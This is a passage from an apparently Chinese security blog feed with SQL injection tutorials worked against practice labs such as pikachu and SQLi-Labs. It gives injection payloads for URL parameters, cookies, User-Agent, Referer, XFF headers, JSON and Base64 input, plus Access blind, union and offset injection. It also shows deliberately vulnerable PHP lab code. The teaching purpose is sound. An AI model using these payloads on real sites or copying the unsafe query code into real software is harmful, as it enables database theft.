<p><img src="https://i.loli.net/2021/11/04/cvpduIW6sehoQHf.png" alt="image-20211104155959079"></p>
<p>但是我们把sqlmap生成的payload拿去做手工注入却可以爆出所有数据库名</p>
<p><img src="https://i.loli.net/2021/11/04/gq2D45iwRYAMy7L.png" alt="image-20211104160159787"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>陈小兵，蒋劭捷，张胜生 著《网络攻防实战研究》</li>
<li>陈小兵，赵春，姜海，薛继东，黄电 著《sqlmap从入门到精通》</li>
<li><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://blog.csdn.net/weixin_45785288/article/details/109696575">sqlmap之tamper脚本_L1ni01-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/dyw_666666/article/details/83148684">sqlmap绕过过滤的tamper脚本分类汇总_烟敛寒林的博客-CSDN博客_sqlmap 绕过关键字过滤</a></li>
<li><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">sqlmap的使用 —— 自带绕过脚本tamper_wkend的博客-CSDN博客_sqlmap tamper脚本</a></li>
<li><a href="https://www.cnblogs.com/Cl0ud/p/14394627.html">SQLMap tamper编写 - 春告鳥 - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入分类</title>
    <url>/post/724e6336.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="按闭合类型分类"><a href="#按闭合类型分类" class="headerlink" title="按闭合类型分类"></a>按闭合类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>我们使用pikachu靶场做演示。打开 pikachu 实验靶场，在 SQL-Inject 下选择数字型注入。</p>
<p><img src="https://i.loli.net/2021/10/05/ZWdMxTPIOyiArjV.png" alt="1.png"></p>
<p>使用burp进行抓包</p>
<p><img src="https://i.loli.net/2021/10/05/RVpriO9cjUT3oLb.png" alt="2.png"></p>
<p>构造payload：<code>1 or 1=1</code></p>
<p><img src="https://i.loli.net/2021/10/05/3HMUmEdoFz5qVG9.png" alt="3.png"></p>
<p>点击发送后，在 Render中查看结果。通过判断存在 SQL 注入，且为数字型注入，可以通过拼接 SQL 语句来实现注入。</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>打开 pikachu 实验靶场，在 SQL-Inject 下选择字符型注入。输入在之前我们已经知道的一个 id</p>
<p><img src="https://i.loli.net/2021/10/05/7RYLJ61UvmGzp3F.png" alt="4.png"></p>
<p>我们发现需要输入字符串来完成查询。按照之前的思路我们写一个查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,email from member where username=&#x27;vince&#x27;;</span><br></pre></td></tr></table></figure>
<p>在这个基础上进行拼接来写一个”万能密码“，按照之前的构想，拼写一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,email from member where username=&#x27;vince&#x27; or &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
<p>接着构造我们的payload <code>&#39;or &#39;1&#39;=&#39;1</code> 并提交</p>
<p><img src="https://i.loli.net/2021/10/05/u6CMDyBlGU5WF2f.png" alt="5.png"></p>
<p>这是用<code>&#39;1</code>的单引号去闭合最后的单引号的方法，还可以使用注释掉后面的参数的方法无视最后的单引号闭合。</p>
<p>payload：<code>&#39;or 1=1 #</code> 或 <code>&#39;or 1=1 -- (--后有一个空格)</code></p>
<p><img src="https://i.loli.net/2021/10/05/terxhdsX7YoH5PI.png" alt="6.png"></p>
<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>打开 pikachu 实验靶场，在 SQL-Inject 下选择搜索型注入。然后随意输入一个字母，能看到匹配出了对应的信息。</p>
<p>按照 SQL 的模糊查询命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段名 like &#x27;%对应值%&#x27;;</span><br></pre></td></tr></table></figure>
<p>发现可以按照之前的思路来实现万能语句的拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from username like &#x27;%vince%&#x27; or 1=1;</span><br></pre></td></tr></table></figure>
<p>构造payload：<code>XXX%&#39;or 1=1#</code></p>
<p><img src="https://i.loli.net/2021/10/05/y1rW7vExZCjKQpJ.png" alt="8.png"></p>
<h3 id="其它闭合类型注入"><a href="#其它闭合类型注入" class="headerlink" title="其它闭合类型注入"></a>其它闭合类型注入</h3><p>由于SQL语句拼接方式不同，所以构造的payload也不同。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> number <span class="keyword">from</span> <span class="keyword">where</span> username<span class="operator">=</span>(<span class="string">&#x27;vince&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>回到 pikachu 平台,将拼接语句写为 <code>XX&#39;) or 1=1#</code></p>
<p><img src="https://i.loli.net/2021/10/05/8cIf1zPWSxRHyBX.png" alt="4c5ff97d5c47c0da796d683152bdee97.png"></p>
<h2 id="按注入提交方式分类"><a href="#按注入提交方式分类" class="headerlink" title="按注入提交方式分类"></a>按注入提交方式分类</h2><p><strong>不同脚本语言表单数据接收函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASP：</span><br><span class="line"></span><br><span class="line">request()    	-- 接收全部提交</span><br><span class="line"></span><br><span class="line">request.querystring() -- 接收get提交</span><br><span class="line"></span><br><span class="line">request.form()	-- 接收post提交</span><br><span class="line"></span><br><span class="line">request.cookie()	-- 接收cookie提交</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line"></span><br><span class="line">$_REQUEST()	-- 接收全部提交</span><br><span class="line"></span><br><span class="line">$_GET()	-- 接收get提交</span><br><span class="line"></span><br><span class="line">$_POST()	-- 接收post提交</span><br><span class="line"></span><br><span class="line">$_COOKIE()	-- 接收cookie提交</span><br></pre></td></tr></table></figure>
<p><strong>HackBar插件</strong></p>
<p>hackbar插件是一款网页渗透测试插件，支持几乎所有的url界面，能对其进行拆分渗透分析，对编程人员带来极大的帮助。该插件将帮助您测试sql注入，XSS漏洞和站点安全性。 它不是执行标准漏洞利用的工具，也不会教您如何入侵网站。 其主要目的是帮助开发人员对其代码进行安全审核。</p>
<h3 id="GET提交注入"><a href="#GET提交注入" class="headerlink" title="GET提交注入"></a>GET提交注入</h3><p>一般直接通过浏览器地址栏提交。这里使用SQLi-Labs来第1关来演示。</p>
<p><img src="https://i.loli.net/2021/10/05/pndjmPkv8wyElrh.png" alt="3d3e06c86153d8d948417f2221a4590b.png"></p>
<h3 id="POST提交注入"><a href="#POST提交注入" class="headerlink" title="POST提交注入"></a>POST提交注入</h3><p>可通过安装火狐浏览器插件（hackbar）或 BurpSuite 工具来完成。这里使用SQLi-Labs来第11关来演示。</p>
<p><img src="https://i.loli.net/2021/10/05/lBg8teHkCKEFxQ5.png" alt="7bebdcd7aec1d546caf3288e45937c05.png"></p>
<h3 id="Cookie头提交注入"><a href="#Cookie头提交注入" class="headerlink" title="Cookie头提交注入"></a>Cookie头提交注入</h3><p>浏览器自动会将Cookie以key/value保存到某个目录下的文本文件内，下次请求同一网站时也会自动发送该Cookie给服务器，即添加在请求头部（前提是浏览器设置为启用cookie）。</p>
<p>Cookie 是网站为了识别用户身份来跟踪会话的,虽然 Cookie 是由后端生成的,但每次页面跳转,后端都回对前端的 Cookie 的信息进行验证,但如果后端获取 Cookie 后放在数据库中进行拼接,那么这也将是一个 SQL 注入点。</p>
<p>这里使用SQLi-Labs来第20关来演示。</p>
<p>先使用admin用户进行登录，并抓包发送到Repeater。</p>
<p><img src="https://i.loli.net/2021/10/05/WXAtJ4xLcYN9QIR.png" alt="472cc26c7785b20e5b4df8044737ee2b.png"></p>
<p>回显登录成功，并记录下了cookie</p>
<p><img src="https://i.loli.net/2021/10/05/Nwq39JYWanUxkch.png" alt="b95d24492714a66b169dfab83fafa686.png"></p>
<p>把POST改为GET，加入cookie，构造我们的payload：<code>admin&#39; or 1=1 #</code></p>
<p><img src="https://i.loli.net/2021/10/05/szeKVJDyOLv4HoB.png" alt="934073bf39b7f876121463cc5c06732d.png"></p>
<p>得到了ID为1的数据，注入成功</p>
<h3 id="User-Agent头提交注入"><a href="#User-Agent头提交注入" class="headerlink" title="User-Agent头提交注入"></a>User-Agent头提交注入</h3><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
<p>这里使用SQLi-Labs来第18关来演示。</p>
<p><img src="https://i.loli.net/2021/10/05/i8VL794sbydo3Tw.png" alt="7a57dbc3c4a5f61c0f037f3c3353d692.png"></p>
<p>先用admin用户正常登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061047363.png" alt="e5a5c674fbf1aa099f6777c4b233174f.png"></p>
<p>显示记录下了User-Agent头部信息</p>
<p>我们重新登录，并使用BurpSuite进行抓包发送到Repeater</p>
<p>修改User-Agent的值，使用单引号进行注入点探测</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061047356.png" alt="bcc2c88749009a9260cb3ea6dc4b5122.png"></p>
<p>这里发现显示错误，我们可以使用<strong>报错注入</strong>（等会会介绍到）</p>
<p>payload：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></p>
<p><img src="https://i.loli.net/2021/10/05/oWFwaPNxHfbJDum.png" alt="04a3f30ba40c59a6faf0605aea711cbe.png"></p>
<p>成功注入，得到了数据库的版本</p>
<h3 id="Referer头提交注入"><a href="#Referer头提交注入" class="headerlink" title="Referer头提交注入"></a>Referer头提交注入</h3><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
<p>这里使用SQLi-Labs来第19关来演示。与Less-18 基本一样，只不过是在Referer处进行注入。参考Less-18。</p>
<p><img src="https://i.loli.net/2021/10/05/GiSUOLRaMT1EoCq.png" alt="ba09273c195bf229cc60c65132467967.png"></p>
<h3 id="X-Forwarded-For头提交注入"><a href="#X-Forwarded-For头提交注入" class="headerlink" title="X-Forwarded-For头提交注入"></a>X-Forwarded-For头提交注入</h3><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段。</p>
<p>这里使用墨者靶场进行演示。</p>
<p>随便输入用户名和密码并进行抓包</p>
<p><img src="https://i.loli.net/2021/10/05/JO96x3T5zm7VgnC.png" alt="b874fb0a52b3b604aa57cea636cd7d11.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061047807.png" alt="82bca639da75059e00c248f0bb56bbd6.png"></p>
<p>通过响应内容可以看出，记录了我们的访问IP地址，而获取访问IP地址信息一般是通过XFF头来实现的</p>
<p>给请求头添加一个XFF，其值为单引号进行探测</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048981.png" alt="ee3fcaef84a9cd7deefe3e37b33cb416.png"></p>
<p>发现显示错误，这里可以用报错注入来实现攻击</p>
<p>payload：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048066.png" alt="b35c830e41736d55c0f9a6e4bdd05bed.png"></p>
<p>成功注入，得到了数据库的版本</p>
<h2 id="按提交方式进行处理分类"><a href="#按提交方式进行处理分类" class="headerlink" title="按提交方式进行处理分类"></a>按提交方式进行处理分类</h2><h3 id="JSON格式化注入"><a href="#JSON格式化注入" class="headerlink" title="JSON格式化注入"></a>JSON格式化注入</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”。</p>
<p>JSON语法：</p>
<ul>
<li>数据在名称/值对中</li>
<li>数据由逗号分隔</li>
<li>大括号保存对象</li>
<li>中括号保存数组</li>
</ul>
<p>演示靶场源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// php防止中文乱码</span></span><br><span class="line"> header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;json&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$json_str</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;json&#x27;</span>];</span><br><span class="line">   <span class="variable">$json</span>=json_decode(<span class="variable">$json_str</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="variable">$json</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;JSON文档格式有误，请检查&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$username</span>=<span class="variable">$json</span>-&gt;username;</span><br><span class="line">   <span class="comment">//$password=$json-&gt;password;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 建立mysql连接，root/root连接本地数据库</span></span><br><span class="line">   <span class="variable">$mysqli</span>=<span class="keyword">new</span> mysqli();</span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$mysqli</span>-&gt;connect_errno)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;数据库连接失败：&#x27;</span>.<span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 要操作的数据库名，我的数据库是security</span></span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;select_db(<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$mysqli</span>-&gt;errno)&#123;</span><br><span class="line">     dir(<span class="string">&#x27;打开数据库失败：&#x27;</span>.<span class="variable">$mysqli</span>-&gt;error);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 数据库编码格式</span></span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;set_charset(<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 从users表中查询username，password字段</span></span><br><span class="line">   <span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM users WHERE username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="variable">$result</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;执行SQL语句失败：&#x27;</span>.<span class="variable">$mysqli</span>-&gt;error);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows==<span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;查询结果为空&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="variable">$array1</span>=<span class="variable">$result</span>-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;用户名：<span class="subst">&#123;$array1[0][&#x27;username&#x27;]&#125;</span>,密码：<span class="subst">&#123;$array1[0][&#x27;password&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 释放资源</span></span><br><span class="line">   <span class="variable">$result</span>-&gt;free();</span><br><span class="line">   <span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>按照特定的数据格式查询admin用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json=&#123;&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用浏览器插件直接发送POST数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049640.png" alt="8a9c30e705e4c42ba1bcd3c7958f091e.png"></p>
<p>构造一个简单的payload，<code>json=&#123;&quot;username&quot;:&quot;&#39; or 1=1 #&quot;&#125;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049681.png" alt="e4a3a6accff9862d0aad4fa114b86a82.png"></p>
<h3 id="Base64编码注入"><a href="#Base64编码注入" class="headerlink" title="Base64编码注入"></a>Base64编码注入</h3><p>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。</p>
<p>在base64注入页面中，程序获取GET参数ID，利用base64_decode ()对参数ID进行base64解码，然后直接将解码后的$id拼接到select语句中进行查询。</p>
<p>演示靶场源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf8&quot;</span>);</span><br><span class="line"><span class="variable">$con</span>=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;qwer&quot;</span>,<span class="string">&quot;security&quot;</span>);</span><br><span class="line">mysqli_set_charset(<span class="variable">$con</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$con</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Connect failed : &quot;</span>.mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;id:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;用户名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;密码:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   print_r(mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;查询的语句是：<span class="subst">$sql</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将<code>1</code>进行base64编码：<code>MQ==</code>，带入查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061049574.png" alt="b5659dd25557a61d426a429464efbf91.png"></p>
<p>将<code>1 or 1=1 #</code>进行Base64编码后，带入查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061048366.png" alt="43ed3fdc2f3913b68725e2f4777b9277.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
<li><a href="https://blog.csdn.net/a15803617402/article/details/82939202">WEB安全学习——Json注入_尚未佩妥剑 转眼便江湖-CSDN博客_json注入</a></li>
<li><a href="https://blog.csdn.net/Drifter_Galaxy/article/details/108678793">SQL注入之 base64注入攻击_coderge的博客-CSDN博客_base64注入</a></li>
<li><a href="https://baike.baidu.com/item/X-Forwarded-For/3593639">X-Forwarded-For_百度百科 (baidu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Access数据库注入攻击方式</title>
    <url>/post/d3a798c0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Access数据库基本知识"><a href="#Access数据库基本知识" class="headerlink" title="Access数据库基本知识"></a>Access数据库基本知识</h2><h3 id="Access数据库介绍"><a href="#Access数据库介绍" class="headerlink" title="Access数据库介绍"></a>Access数据库介绍</h3><p>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 Microsoft Jet Database Engine 和 图形用户界面两项特点，是 Microsoft Office 的系统程序之一。</p>
<p>Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。它是微软OFFICE的一个成员, 在包括专业版和更高版本的office版本里面被单独出售。2018年9月25日,最新的微软Office Access 2019在微软Office 2019里发布。 MS ACCESS以它自己的格式将数据存储在基于Access Jet的数据库引擎里。它还可以直接导入或者链接数据(这些数据存储在其他应用程序和数据库)。</p>
<h3 id="Access数据库的特点"><a href="#Access数据库的特点" class="headerlink" title="Access数据库的特点"></a>Access数据库的特点</h3><p>Access以它自己的格式将数据存储在基于Access Jet的数据库引擎里。Access数据库属于文件型数据库，所以不需要端口号。</p>
<p>在Office 2007之前的Access数据库文件的后缀是 <strong>.mdb</strong> ，Office2007及其之后的Access数据库文件的后缀是 <strong>.accdb</strong> 。</p>
<p>Access数据库中没有注释符号，因此 /**/ 、 — 和 # 都没法使用。</p>
<p>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。</p>
<p>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> len(&quot;string&quot;)        查询给定字符串的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">asc</span>(&quot;a&quot;)             查询给定字符串的ascii值</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> mid(&quot;string&quot;,<span class="number">2</span>,<span class="number">1</span>)    查询给定字符串从指定索引开始的长度</span><br><span class="line"></span><br><span class="line">top  n                      查询前n条记录</span><br></pre></td></tr></table></figure>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>可以使用如下方法来判断：</p>
<ul>
<li>特殊符号，\、/、’、”等。</li>
<li>-0 减数字看是否变化。</li>
<li>逻辑关系，<code>and 1=1</code> <code>and 1=2</code></li>
</ul>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>asp一般搭载access或者mssql，首先得判断出来是哪一类数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists (select * from msysobjects)</span><br></pre></td></tr></table></figure>
<p>正常回显即为access数据库，如果报错可看报错信息来判断是否在access数据库。</p>
<p>报出以下错误说明该数据库存在<code>msysobjects</code>这张数据表，说明该数据库为Access</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/37626e4fe2f47655dcf67dfcea2d3bc2.png" alt="37626e4fe2f47655dcf67dfcea2d3bc2.png"></p>
<p>下面这个为sqlserver的判断语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from sysobjects)</span><br></pre></td></tr></table></figure>
<h3 id="猜表名与字段名"><a href="#猜表名与字段名" class="headerlink" title="猜表名与字段名"></a>猜表名与字段名</h3><p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from admin)</span><br></pre></td></tr></table></figure>
<p><strong>猜解字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select user from admin)</span><br></pre></td></tr></table></figure>
<p>由于access的系统表不像mysql一样具有系统索引库，所以表名和列名都只能靠猜……如果通过社工、工具、经验（比如看后台源码的表单名字）都搞不出来的话，就只能通过偏移注入来试试运气了。</p>
<h3 id="逐字猜解数据"><a href="#逐字猜解数据" class="headerlink" title="逐字猜解数据"></a>逐字猜解数据</h3><p><strong>猜解一张表中有多少条记录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(*) from admin)&gt;3</span><br></pre></td></tr></table></figure>
<p><strong>猜解字段内容长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select len(user) from admin)=5</span><br></pre></td></tr></table></figure>
<p><strong>猜解字段内容数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select top 1 asc(mid(user,1,1)) from admin)&gt;95</span><br></pre></td></tr></table></figure>
<h2 id="联合查找注入"><a href="#联合查找注入" class="headerlink" title="联合查找注入"></a>联合查找注入</h2><h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 11</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/90342b450e3ec99476523036222783f6.png" alt="90342b450e3ec99476523036222783f6.png"></p>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/29085dfd90b5fd67fd8f7629d1c850be.png" alt="29085dfd90b5fd67fd8f7629d1c850be.png"></p>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,s_user,s_pwd,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/852a57eed1f78e57db355b80fe3504f2.png" alt="852a57eed1f78e57db355b80fe3504f2.png"></p>
<h2 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p>
<p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><ul>
<li>假设一个表有8个字段，admin表有3个字段。</li>
<li>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin</li>
<li>在我们不知道admin有多少字段的情况下可以尝试payload：<code>union select 1,2,3,4,5,6,7,admin.* from admin</code>，此时页面出错</li>
<li>直到payload：<code>union select 1,2,3,4,5,admin.* from admin</code>时页面返回正常，说明admin表有三个字段</li>
<li>然后通过移动admin.*的位置，就可以回显不同的数据</li>
</ul>
<h3 id="判断查询列数-1"><a href="#判断查询列数-1" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 38</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/12bb577bfb8ed7fd6e22b1cc1f798ebf.png" alt="12bb577bfb8ed7fd6e22b1cc1f798ebf.png"></p>
<h3 id="判断回显位-1"><a href="#判断回显位-1" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38 from admin</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/dcd9b04d83b81ddf09a3a1bfa647925e.png" alt="dcd9b04d83b81ddf09a3a1bfa647925e.png"></p>
